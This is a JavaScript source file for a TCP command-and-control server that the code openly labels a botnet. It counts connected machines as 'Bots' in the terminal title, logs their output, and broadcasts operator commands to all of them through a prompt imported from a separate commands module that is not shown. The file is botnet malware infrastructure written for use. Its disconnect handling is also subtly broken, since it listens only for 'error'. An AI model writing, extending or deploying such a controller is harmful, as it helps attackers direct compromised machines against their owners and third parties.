import net from "net";
import prompt from "./commands.js";
import dotenv from "dotenv";

dotenv.config({ path: "../config/.env" });

let clientCount = 0;
let clients, clientInstances;

const clientModules = {
	clients: (clients = []),
	clientInstances: clientInstances,
};

const PORT = process.env.PORT;
const HOST = process.env.HOST;

function setTerminalTitle() {
	process.stdout.write(
		String.fromCharCode(27) +
			"]0;" +
			`Botnet | Bots: ${clientCount}` +
			String.fromCharCode(7)
	);
}
setTerminalTitle();

function broadcast(message) {
	clientModules.clientInstances.forEach((client) => {
		client.write(message);
	});
	process.stdout.write("\n" + message);
}

net
	.createServer((socket) => {
		// Identify client
		socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

		// On client connect

		clientModules.clients.push(socket);
		clientCount++;

		clientModules.clientInstances = [...clientModules.clients];
		setTerminalTitle();

		console.log(`Client ${socket.name} has connected.\n`);

		prompt();

		socket.on("data", (data) => {
			broadcast(`[CLIENT ${socket.name}] ` + data, socket);
			prompt();
		});

		socket.on("error" || "end", () => {
			clientDisconnected();
		});

		function clientDisconnected() {
			clientModules.clients.splice(clientModules.clients.indexOf(socket), 1);
			clientCount--;
			clientModules.clientInstances = [...clientModules.clients];
			console.log(`Client ${socket.name} has disconnected.\n`);
			if (clientCount < 1) console.log("Waiting for clients to connect.\n");
			setTerminalTitle();
		}
	})
	.listen(PORT, HOST);

console.log(`Server running on ${HOST}:${PORT}.`);
console.log(`Waiting for connections.\n`);

export { clientModules, broadcast };
